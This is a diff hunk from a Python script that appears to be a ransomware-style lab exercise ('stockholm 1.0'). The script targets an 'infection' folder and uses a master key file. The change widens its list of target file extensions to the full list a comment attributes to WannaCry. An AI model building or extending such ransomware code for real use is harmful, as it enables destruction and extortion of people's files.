@@ -9,8 +9,22 @@ infect = str(Path.home()) + "/infection"
 folder = str(Path.home()) + "/decrypt_folder"
 master_key_file = "master.key"
 vers = "stockholm 1.0"
-exts = [".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".jpg", ".jpeg", ".png", ".bmp", 
-               ".psd", ".mp3", ".mp4", ".mov", ".avi", ".zip", ".rar", ".7z", ".rtf"]
+# All file extensions affected by WannaCry ransomware
+exts = ['.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.accdb', '.aes', '.ai', '.arc', '.asc', 
+        '.asf', '.asm', '.asp', '.asx', '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2', '.c', 
+        '.cab', '.cap', '.cc', '.cer', '.cfg', '.cfm', '.cgi', '.class', '.cmd', '.cpp', '.crt', '.cs', 
+        '.csr', '.csv', '.db', '.dbf', '.dch', '.der', '.dif', '.dip', '.djv', '.djvu', '.doc', '.docb', 
+        '.docm', '.docx', '.dot', '.dotm', '.dotx', '.dtd', '.dwg', '.edb', '.eml', '.eps', '.exe', '.f', 
+        '.f4v', '.fla', '.flv', '.frm', '.gif', '.gpg', '.gz', '.h', '.hwp', '.ibd', '.iso', '.jar', '.java', 
+        '.jpeg', '.jpg', '.js', '.jsp', '.key', '.lay', '.lay6', '.ldf', '.lua', '.m', '.m3u', '.m4u', '.max', 
+        '.mdb', '.mdf', '.mfd', '.mid', '.mkv', '.mml', '.mov', '.mp3', '.mp4', '.mpa', '.mpeg', '.mpg', '.msg', 
+        '.msi', '.myd', '.myi', '.nef', '.odb', '.odg', '.odp', '.ods', '.odt', '.ora', '.ost', '.otg', '.otp', 
+        '.ots', '.ott', '.p12', '.paq', '.pas', '.pdf', '.pem', '.php', '.pl', '.png', '.pot', '.potm', '.potx', 
+        '.ppam', '.pps', '.ppsm', '.ppsx', '.ppt', '.pptm', '.pptx', '.ps1', '.psd', '.pst', '.rar', '.raw', '.rb', 
+        '.rtf', '.sch', '.sldm', '.sldx', '.slk', '.sln', '.sql', '.sqlite', '.ss', '.ssa', '.ssb', '.sxc', '.sxd', 
+        '.sxi', '.sxm', '.sxw', '.tar', '.tbk', '.tgz', '.tif', '.tiff', '.txt', '.uop', '.uot', '.vb', '.vbs', '.vcd', 
+        '.vdi', '.vmdk', '.vmx', '.vob', '.vsd', '.vsdx', '.wav', '.wb2', '.wk1', '.wks', '.wma', '.wmv', '.xlc', '.xlm', 
+        '.xls', '.xlsb', '.xlsm', '.xlsx', '.xlt', '.xltm', '.xltx', '.xlw', '.xml', '.zip']
 
 # Check files 
 def check_file(element, form):
